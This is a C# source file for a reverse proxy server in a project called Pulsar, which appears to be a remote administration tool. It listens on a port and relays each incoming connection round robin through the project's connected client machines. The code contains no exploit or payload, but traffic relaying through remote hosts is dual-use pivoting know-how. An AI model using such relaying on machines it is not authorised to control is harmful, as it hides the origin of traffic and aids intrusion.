using Pulsar.Server.Networking;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Pulsar.Server.ReverseProxy
{
    public class ReverseProxyServer
    {
        public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

        public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);

        public event ConnectionEstablishedCallback OnConnectionEstablished;
        public event UpdateConnectionCallback OnUpdateConnection;

        private Socket _socket;
        private readonly List<ReverseProxyClient> _clients;
        private readonly object _sync = new object();
        private int _generation;
        private int _acceptInProgress;
        private bool _isStarted;
        private string _listenerSessionId;

        public bool IsStarted
        {
            get { lock (_sync) return _isStarted; }
        }

        public string ListenerSessionId
        {
            get { lock (_sync) return _listenerSessionId; }
        }

        public string BindAddress { get; private set; }
        public ushort Port { get; private set; }

        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_clients)
                {
                    return _clients.ToArray();
                }
            }
        }

        public ReverseProxyClient[] OpenConnections
        {
            get
            {
                lock (_clients)
                {
                    List<ReverseProxyClient> temp = new List<ReverseProxyClient>();

                    for (int i = 0; i < _clients.Count; i++)
                    {
                        if (_clients[i].ProxySuccessful)
                        {
                            temp.Add(_clients[i]);
                        }
                    }
                    return temp.ToArray();
                }
            }
        }


        public Client[] Clients { get; private set; }

        //We can also use the Random class but not sure if that will evenly spread the connections
        //The Random class might even fail to make use of all the clients
        private uint _clientIndex;

        public ReverseProxyServer()
        {
            _clients = new List<ReverseProxyClient>();
        }

        public void StartServer(Client[] clients, string ipAddress, ushort port)
        {
            if (port == 0)
                throw new ArgumentOutOfRangeException(nameof(port));

            if (clients == null)
                throw new ArgumentNullException(nameof(clients));

            var eligible = clients.Where(c => c != null && c.Connected).Distinct().ToArray();
            if (eligible.Length == 0)
                throw new InvalidOperationException("No connected clients are eligible for reverse proxy routing.");

            Stop();

            IPAddress address;
            if (!IPAddress.TryParse(ipAddress, out address))
                throw new ArgumentException("Invalid bind address.", nameof(ipAddress));

            var socket = new Socket(address.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            socket.Bind(new IPEndPoint(address, port));
            socket.Listen(128);

            lock (_sync)
            {
                this.Clients = eligible;
                this._socket = socket;
                this._isStarted = true;
                this.BindAddress = ipAddress;
                this.Port = port;
                this._listenerSessionId = ReverseProxyValidation.CreateSessionId();
                this._generation++;
            }

            BeginAccept(Volatile.Read(ref _generation));
        }

        private void BeginAccept(int generation)
        {
            if (Interlocked.CompareExchange(ref _acceptInProgress, 1, 0) != 0)
                return;

            Socket socket;
            lock (_sync)
            {
                socket = _socket;
            }

            if (socket == null)
            {
                Interlocked.Exchange(ref _acceptInProgress, 0);
                return;
            }

            try
            {
                socket.BeginAccept(ar => AsyncAccept(ar, generation), null);
            }
            catch
            {
                Interlocked.Exchange(ref _acceptInProgress, 0);
                Stop();
            }
        }
        private void AsyncAccept(IAsyncResult ar, int generation)
        {
            Interlocked.Exchange(ref _acceptInProgress, 0);

            lock (_sync)
            {
                if (!_isStarted || generation != _generation)
                    return;
            }

            Socket accepted = null;
            try
            {
                lock (_sync)
                {
                    accepted = _socket?.EndAccept(ar);
                }
            }
            catch
            {
                BeginAccept(generation);
                return;
            }

            if (accepted == null)
            {
                BeginAccept(generation);
                return;
            }

            Client[] eligible;
            lock (_sync)
            {
                eligible = Clients?.Where(c => c != null && c.Connected).ToArray()
                           ?? Array.Empty<Client>();
            }

            if (eligible.Length == 0)
            {
                try { accepted.Close(); } catch { }
                BeginAccept(generation);
                return;
            }

            ReverseProxyClient proxyClient;
            lock (_sync)
            {
                if (!_isStarted || generation != _generation)
                {
                    try { accepted.Close(); } catch { }
                    return;
                }

                proxyClient = new ReverseProxyClient(
                    eligible[(int)(_clientIndex % (uint)eligible.Length)],
                    accepted,
                    this);
                _clientIndex++;
                _clients.Add(proxyClient);
            }

            BeginAccept(generation);
        }

        public void Stop()
        {
            int generation;
            lock (_sync)
            {
                generation = ++_generation;
                _isStarted = false;
                _listenerSessionId = null;
                BindAddress = null;
                Port = 0;
            }

            Interlocked.Exchange(ref _acceptInProgress, 0);

            Socket socket;
            lock (_sync)
            {
                socket = _socket;
                _socket = null;
            }

            if (socket != null)
            {
                try { socket.Close(); } catch { }
            }

            ReverseProxyClient[] snapshot;
            lock (_clients)
            {
                snapshot = _clients.ToArray();
                _clients.Clear();
            }

            foreach (ReverseProxyClient client in snapshot)
                client.Disconnect();

            Volatile.Write(ref _generation, generation);
        }

        public ReverseProxyClient GetClientByConnectionId(int connectionId)
        {
            lock (_clients)
            {
                return _clients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
        {
            try
            {
                if (OnConnectionEstablished != null)
                    OnConnectionEstablished(proxyClient);
            }
            catch
            {
            }
        }

        internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
        {
            //remove a client that has been disconnected
            try
            {
                if (!proxyClient.IsConnected)
                {
                    lock (_clients)
                    {
                        for (int i = 0; i < _clients.Count; i++)
                        {
                            if (_clients[i].ConnectionId == proxyClient.ConnectionId)
                            {
                                _clients.RemoveAt(i);
                                break;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            try
            {
                if (OnUpdateConnection != null)
                    OnUpdateConnection(proxyClient);
            }
            catch
            {
            }
        }
    }
}